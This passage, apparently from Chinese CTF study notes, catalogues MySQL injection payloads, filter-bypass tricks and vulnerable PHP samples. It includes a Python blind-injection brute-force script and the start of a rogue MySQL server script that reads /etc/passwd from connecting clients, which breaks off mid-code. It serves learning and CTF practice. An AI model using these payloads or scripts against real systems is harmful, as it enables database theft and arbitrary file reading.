<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<p>multilinestring</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br></pre></td></tr></table></figure>

<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>只要页面有不同的回显就有可能存在布尔盲注</p>
<p>需要会写二分法盲注脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//正常情况</span><br><span class="line">&apos;or bool#</span><br><span class="line">true&apos;and bool#</span><br><span class="line">    </span><br><span class="line">//不使用空格、注释</span><br><span class="line">&apos;or(bool)=&apos;1</span><br><span class="line">true&apos;and(bool)=&apos;1</span><br><span class="line">    </span><br><span class="line">//不使用or、and、注释</span><br><span class="line">&apos;^!(bool)=&apos;1</span><br><span class="line">&apos;=(bool)=&apos;</span><br><span class="line">&apos;||(bool)=&apos;1</span><br><span class="line">true&apos;%26%26(bool)=&apos;1</span><br><span class="line">&apos;=if((bool),1,0)=&apos;0</span><br><span class="line">    </span><br><span class="line">//不使用等号、空格、注释</span><br><span class="line">&apos;or(bool)&lt;&gt;&apos;0</span><br><span class="line">&apos;or((bool)in(1))or&apos;0</span><br><span class="line">    </span><br><span class="line">//其他</span><br><span class="line">or (case when (bool) then 1 else 0 end)</span><br></pre></td></tr></table></figure>

<p>异或构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;^(ascii(mid((password)from(i)for(1)))&gt;j)^&apos;1&apos;=&apos;1&apos; #</span><br></pre></td></tr></table></figure>

<p>pow函数数值溢出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select if(1,1,pow(2,222222222222)); //条件为真，返回1</span><br><span class="line">select if(0,1,pow(2,222222222222)); //条件为假，报错</span><br></pre></td></tr></table></figure>

<p>Mid构造布尔条件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mid(version(),(ascii(substr((select group_concat(password)%0afrom%0aadmin),1,1)))&gt;63.0,1)</span><br></pre></td></tr></table></figure>

<p>谜之布尔盲注exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; !=!!(ascii(mid((select version())from(2)))=47) !=!!&apos;1</span><br></pre></td></tr></table></figure>

<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>sleep</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(5)</span><br></pre></td></tr></table></figure>

<p>BENCHMARK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select benchmark(1000000,sha(1))</span><br></pre></td></tr></table></figure>

<p>笛卡尔积</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C</span><br></pre></td></tr></table></figure>

<p>GET_LOCK </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#session 1</span><br><span class="line">select get_lock(&apos;test&apos;,1)</span><br><span class="line"></span><br><span class="line">#session 2</span><br><span class="line">select get_lock(&apos;test&apos;,5)</span><br></pre></td></tr></table></figure>

<p>rpad/repeat</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&apos;a&apos;,4999999,&apos;a&apos;) RLIKE concat(repeat(&apos;(a.*)+&apos;,30),&apos;b&apos;)</span><br></pre></td></tr></table></figure>

<p>通过<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短</p>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>对从数据库中取出的数据没有进行过滤，导致二次注入</p>
<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><h4 id="php迭代次数限制，绕过preg-match的过滤"><a href="#php迭代次数限制，绕过preg-match的过滤" class="headerlink" title="php迭代次数限制，绕过preg_match的过滤"></a>php迭代次数限制，绕过preg_match的过滤</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union/*&apos;+&apos;a&apos;*1000000+&apos;*/select 1,2,3-- -&apos;</span><br></pre></td></tr></table></figure>

<h4 id="select-被过滤"><a href="#select-被过滤" class="headerlink" title="select 被过滤"></a>select 被过滤</h4><p>堆叠注入（强网杯2019），利用原理： <strong>mysqli_multi_query</strong>  </p>
<p>采用预加载去绕过select</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set @sql=concat(&apos;selec&apos;,&apos;t flag from `1919810931114514`&apos;);</span><br><span class="line">prepare presql from @sql;</span><br><span class="line">execute presql;</span><br><span class="line">deallocate prepare presql;</span><br></pre></td></tr></table></figure>

<h4 id="括号被过滤"><a href="#括号被过滤" class="headerlink" title="括号被过滤"></a>括号被过滤</h4><p>利用 order by 的不同回显进行盲注（第五空间线下web）</p>
<p>查询语句类似如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"select * from admin where  username ='$username' and password = '$password'"</span>;</span><br></pre></td></tr></table></figure>

<p>过滤如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filterlist = <span class="string">"/\(|\)|username|password|where|case|when|like|regexp|into|limit|=|for|;/"</span>;</span><br></pre></td></tr></table></figure>

<p>回显语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($res-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">	$row = $res -&gt; fetch_assoc();</span><br><span class="line">	<span class="keyword">if</span>($row[<span class="string">'id'</span>])&#123;</span><br><span class="line">		<span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1/2.php'</span></span><br><span class="line">d = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;'</span></span><br><span class="line">out = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(d)):</span><br><span class="line">        payload = <span class="string">"admin' union select 1,2,'&#123;0&#125;' order by 3 -- +"</span>.format(out+d[j])</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:payload, <span class="string">'password'</span>:<span class="string">'abcde'</span>&#125;</span><br><span class="line">        result = requests.post(url, data=data).text</span><br><span class="line">        <span class="comment">#print(result)</span></span><br><span class="line">        <span class="keyword">if</span> len(result) &gt; <span class="number">7</span>:</span><br><span class="line">            out += d[j<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(out)</span><br></pre></td></tr></table></figure>

<h4 id="禁用information-schema"><a href="#禁用information-schema" class="headerlink" title="禁用information_schema"></a>禁用information_schema</h4><p>mysql 5.6.X起，新增了<code>innodb_index_stats</code>和<code>innodb_table_stats</code>两个表</p>
<p>其中<code>innodb_index_stats</code>存储的是innodb引擎的库名,表名及其对应的索引名称.<code>innodb_table_stats</code>存储的是innodb引擎的库名和表名,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()</span><br></pre></td></tr></table></figure>

<h4 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h4><p>漏洞成因：</p>
<p>占位符位于 <code>%</code> 符号之后，由数字和 <code>\$</code>组成，如果%后面出现一个\，那么PHP会把\当做一个格式化字符的类型而吃掉\，最后<code>%\</code>(或者<code>%1$\</code>)都会被置空，其实就是%后的一个字符(除了%)都会被当作字符型类型而被吃掉，也就是被当做一个类型进行匹配后面的变量  会逃逸出一个<code>&#39;</code></p>
<p>漏洞代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $password = &quot;123456&quot;;</span><br><span class="line">  $sql = &quot;select * from user where username=&apos;%s&apos;&quot;;</span><br><span class="line">  $sql = sprintf($sql,$username);</span><br><span class="line">  $sql = &quot;$sql and password = &apos;%s&apos;&quot; ;</span><br><span class="line">  $sql = sprintf($sql,$password);</span><br><span class="line">  echo $sql;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>利用：admin%1$&#39; or 1=1# </p>
<p>参考链接： <a href="https://paper.seebug.org/386/" target="_blank" rel="noopener">https://paper.seebug.org/386/</a> </p>
<h4 id="报错注入，过滤concat"><a href="#报错注入，过滤concat" class="headerlink" title="报错注入，过滤concat"></a>报错注入，过滤concat</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select updatexml(1,make_set(3,&apos;~&apos;,(select user())),1);</span><br></pre></td></tr></table></figure>

<h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>注释绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select/**/username/**/from/**/user</span><br></pre></td></tr></table></figure>

<p>回车替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select%0ausername%0afrom%0auser</span><br></pre></td></tr></table></figure>

<p>非常规操作（RCTF2015）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())</span><br></pre></td></tr></table></figure>

<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>漏洞成因： 连接字符集为gbk，对传入的值已用addslashes()做了转义 </p>
<p>漏洞代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=gb2312&quot;);</span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$username = &quot;root&quot;;</span><br><span class="line">$password = &quot;123456&quot;;</span><br><span class="line">$dbname = &quot;test&quot;;</span><br><span class="line">// 创建连接</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connect error: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$uid = addslashes($_GET[&apos;id&apos;]);</span><br><span class="line">$sql = &quot;SELECT * FROM user where id=$uid&quot;;</span><br><span class="line">mysqli_query($conn, &quot;set names gbk&quot;);</span><br><span class="line">$result = mysqli_query($conn, $sql);</span><br><span class="line">print_r(&apos;当前语句: &apos; .$sql. &apos;&lt;br /&gt;&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>利用： id=2%df ‘</p>
<h4 id="二次urldecode注入"><a href="#二次urldecode注入" class="headerlink" title="二次urldecode注入"></a>二次urldecode注入</h4><p>如果某处使用了urldecode或者rawurldecode函数，会导致二次解码生成单引号。<br>如我们提交的是/test.php?id=1%2527，因为没有提交单引号没有触发过滤，%25的解码结果是%。则第一次解码之后是/test.php?id=1%27，如果程序里面再次使用urldecode解码id参数的话，就会生成/test.php?id=1’，单引号成功闭合。 </p>
<h4 id="16进制绕过单引号被过滤或敏感词检测"><a href="#16进制绕过单引号被过滤或敏感词检测" class="headerlink" title="16进制绕过单引号被过滤或敏感词检测"></a>16进制绕过单引号被过滤或敏感词检测</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,table_name,3,4 from information_schema.tables where table_schema=0x76657374</span><br></pre></td></tr></table></figure>

<h4 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h4><p>mid的逗号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select mid(user() from 1 for 1)&lt;150</span><br></pre></td></tr></table></figure>

<p>limit的逗号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 1 offset 2</span><br></pre></td></tr></table></figure>

<h4 id="未知字段名"><a href="#未知字段名" class="headerlink" title="未知字段名"></a>未知字段名</h4><p>使用 join</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(c) from (select * from ((select &apos;a&apos;)a join (select &apos;b&apos;)b join (select &apos;c&apos;)c) union/**/select * from fl111aa44a99g)d</span><br></pre></td></tr></table></figure>

<h4 id="利用异或去爆破password"><a href="#利用异或去爆破password" class="headerlink" title="利用异或去爆破password"></a>利用异或去爆破password</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;^(ascii(mid((password)from(i)))&gt;j)^&apos;1&apos;=&apos;1&apos;%23</span><br></pre></td></tr></table></figure>

<h4 id="between-and-盲注"><a href="#between-and-盲注" class="headerlink" title="between and 盲注"></a>between and 盲注</h4><p>在过滤了<code>=</code>,<code>like</code>, <code>regexp</code>,<code>&gt;</code>,<code>&lt;</code>的情况下使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database() between &apos;t&apos; and &apos;z&apos;</span><br></pre></td></tr></table></figure>

<h4 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h4><p>要求版本小于 <strong>5.6.6</strong> </p>
<p>利用如下</p>
<p>报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from users order by id desc limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>

<p>时间盲注</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>

<h4 id="union-select-和-in被过滤"><a href="#union-select-和-in被过滤" class="headerlink" title="union select 和 in被过滤"></a>union select 和 in被过滤</h4><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from sys.x$schema_table_statistics where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure>

<h4 id="未知表名、不能使用逗号、不能截断的时间盲注"><a href="#未知表名、不能使用逗号、不能截断的时间盲注" class="headerlink" title="未知表名、不能使用逗号、不能截断的时间盲注"></a>未知表名、不能使用逗号、不能截断的时间盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select case when ((SELECT length(t.4) from (select * from((select 1)a join(select 2)b join (select 3)c join (select 4)d) union/**/select * from flag) as t limit 1 offset 1) =&quot;+str(i)+&quot;) then sleep(2) else 0 end)</span><br></pre></td></tr></table></figure>

<h3 id="其他利用姿势"><a href="#其他利用姿势" class="headerlink" title="其他利用姿势"></a>其他利用姿势</h3><h4 id="load-data-infile-任意文件读取"><a href="#load-data-infile-任意文件读取" class="headerlink" title="load data infile 任意文件读取"></a>load data infile 任意文件读取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#coding: utf8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import asyncore</span><br><span class="line">import asynchat</span><br><span class="line">import struct</span><br><span class="line">import random</span><br><span class="line">import logging</span><br><span class="line">import logging.handlers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PORT = 3306</span><br><span class="line"></span><br><span class="line">log = logging.getLogger(__name__)</span><br><span class="line"></span><br><span class="line">log.setLevel(logging.INFO)</span><br><span class="line">tmp_format = logging.handlers.WatchedFileHandler(&apos;mysql.log&apos;, &apos;ab&apos;)</span><br><span class="line">tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))</span><br><span class="line">log.addHandler(</span><br><span class="line">    tmp_format</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">filelist = (</span><br><span class="line">    &apos;/etc/passwd&apos;,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#================================================</span><br><span class="line">#=======No need to change after this lines=======</span><br><span class="line">#================================================</span><br><span class="line"></span><br><span class="line">__author__ = &apos;Gifts&apos;</span><br><span class="line"></span><br><span class="line">def daemonize():</span><br><span class="line">    import os, warnings</span><br><span class="line">    if os.name != &apos;posix&apos;:</span><br><span class="line">        warnings.warn(&apos;Cant create daemon on non-posix system&apos;)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    if os.fork(): os._exit(0)</span><br><span class="line">    os.setsid()</span><br><span class="line">    if os.fork(): os._exit(0)</span><br><span class="line">    os.umask(0o022)</span><br><span class="line">    null=os.open(&apos;/dev/null&apos;, os.O_RDWR)</span><br><span class="line">    for i in xrange(3):</span><br><span class="line">        try:</span><br><span class="line">            os.dup2(null, i)</span><br><span class="line">        except OSError as e:</span><br><span class="line">            if e.errno != 9: raise</span><br><span class="line">    os.close(null)</span><br><span class="line"></span><br><span class="line">class LastPacket(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class OutOfOrder(Exception):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class mysql_packet(object):</span><br><span class="line">    packet_header = struct.Struct(&apos;&lt;Hbb&apos;)</span><br><span class="line">    packet_header_long = struct.Struct(&apos;&lt;Hbbb&apos;)</span><br><span class="line">    def __init__(self, packet_type, payload):</span><br><span class="line">        if isinstance(packet_type, mysql_packet):</span><br><span class="line">            self.packet_num = packet_type.packet_num + 1</span><br><span class="line">        else:</span><br><span class="line">            self.packet_num = packet_type</span><br><span class="line">        self.payload = payload</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        payload_len = len(self.payload)</span><br><span class="line">        if payload_len &lt; 65536:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num)</span><br><span class="line">        else:</span><br><span class="line">            header = mysql_packet.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num)</span><br><span class="line"></span><br><span class="line">        result = &quot;&#123;0&#125;&#123;1&#125;&quot;.format(</span><br><span class="line">            header,</span><br><span class="line">            self.payload</span><br><span class="line">        )</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(str(self))</span><br><span class="line">        </span><br><span class="line">    @staticmethod</span><br><span class="line">    def parse(raw_data):</span><br><span class="line">        packet_num = ord(raw_data[0])</span><br><span class="line">        payload = raw_data[1:]</span><br><span class="line"></span><br><span class="line">        return mysql_packet(packet_num, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class http_request_handler(asynchat.async_chat):</span><br><span class="line"></span><br><span class="line">    def __init__(self, addr):</span><br><span class="line">        asynchat.async_chat.__init__(self, sock=addr[0])</span><br><span class="line">        self.addr = addr[1]</span><br><span class="line">        self.ibuffer = []</span><br><span class="line">        self.set_terminator(3)</span><br><span class="line">        self.state = &apos;LEN&apos;</span><br><span class="line">        self.sub_state = &apos;Auth&apos;</span><br><span class="line">        self.logined = False</span><br><span class="line">        self.push(</span><br><span class="line">            mysql_packet(</span><br><span class="line">                0,</span><br><span class="line">                &quot;&quot;.join((</span><br><span class="line">                    &apos;\x0a&apos;,  # Protocol</span><br><span class="line">                    &apos;5.6.28-0ubuntu0.14.04.1&apos; + &apos;\0&apos;,</span><br><span class="line">                    &apos;\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&apos;,</span><br><span class="line">                ))            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.order = 1</span><br><span class="line">        self.states = [&apos;LOGIN&apos;, &apos;CAPS&apos;, &apos;ANY&apos;]</span><br><span class="line"></span><br><span class="line">    def push(self, data):</span><br><span class="line">        log.debug(&apos;Pushed: %r&apos;, data)</span><br><span class="line">        data = str(data)</span><br><span class="line">        asynchat.async_chat.push(self, data)</span><br><span class="line">            def collect_incoming_data(self, data):</span><br><span class="line">        log.debug(&apos;Data recved: %r&apos;, data)</span><br><span class="line">        self.ibuffer.append(data)</span><br><span class="line"></span><br><span class="line">    def found_terminator(self):</span><br><span class="line">        data = &quot;&quot;.join(self.ibuffer)</span><br><span class="line">        self.ibuffer = []</span><br><span class="line"></span><br><span class="line">        if 